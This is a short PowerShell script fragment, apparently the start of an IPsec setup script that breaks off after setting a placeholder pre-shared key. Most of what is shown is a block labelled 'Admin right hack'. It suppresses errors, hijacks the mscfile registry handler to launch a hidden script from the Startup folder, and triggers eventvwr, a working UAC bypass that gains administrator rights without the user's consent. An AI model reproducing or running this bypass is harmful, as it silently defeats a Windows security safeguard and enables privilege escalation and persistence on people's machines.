$ErrorActionPreference= 'silentlycontinue'
# Ask for elevated permissions if required
# Admin right hack starts here.
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] “Administrator”))
{
New-Item -Path HKCU:\Software\Classes\mscfile\shell\open -Name Command –Force | Out-Null
Set-Item -Path HKCU:\Software\Classes\mscfile\shell\open\Command -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "C:\ProgramData\Microsoft\Windows\Start` `Menu\Programs\StartUp\powershell.ps1"' | Out-Null
eventvwr
}
Else {
# Admin right hack stops here.
# PLEASE EDIT THE BELOW LINE TO SET YOUR IPSEC PASSWORD (This may be randomly generated in the future)
$ThePreSharedKey = 'PasswordCHANGEME'
